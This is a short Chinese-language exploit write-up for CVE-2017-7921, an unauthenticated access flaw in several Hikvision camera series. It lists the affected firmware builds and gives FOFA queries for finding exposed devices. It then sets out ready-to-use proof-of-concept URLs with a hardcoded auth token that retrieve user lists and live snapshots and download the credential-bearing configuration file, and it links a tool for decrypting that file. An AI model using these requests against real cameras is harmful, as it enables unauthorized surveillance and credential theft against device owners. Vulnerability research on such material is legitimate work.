# 海康威视 CVE-2017-7921 未授权漏洞

## 漏洞描述

成功利用这些漏洞可能会导致恶意攻击者提升其权限或假设已验证用户的身份并获取敏感数据。

## 漏洞影响

```
海康威视 DS-2CD2xx2F-I Series V5.2.0 build 140721至V5.4.0 build 160530
DS-2CD2xx0F-I Series V5.2.0 build 140721至V5.4.0 build 160401
DS-2CD2xx2FWD Series V5.3.1 build 150410至V5.4.4 build 161125
DS-2CD4x2xFWD Series V5.2.0 build 140721至V5.4.0 build 160414
```

## FOFA

```
header="Hikvision"			  
app="HIKVISION-视频监控"
```

## POC

1.检索设备列表

```
http://IP/Security/users?auth=YWRtaW46MTEK
```

2.获取监控快照

```
http://IP/onvif-http/snapshot?auth=YWRtaW46MTEK
```

3.下载摄像头配置账号密码文件

```
http://IP/System/configurationFile?auth=YWRtaW46MTEK
```

- 浏览器会自动下载一个名为 `configurationFile` 的文件,需要经过解密。
  Payload: https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor
- 需要一个工具 `wxMEdit` 打开解密后的配置文件,搜索关键字 `admin`.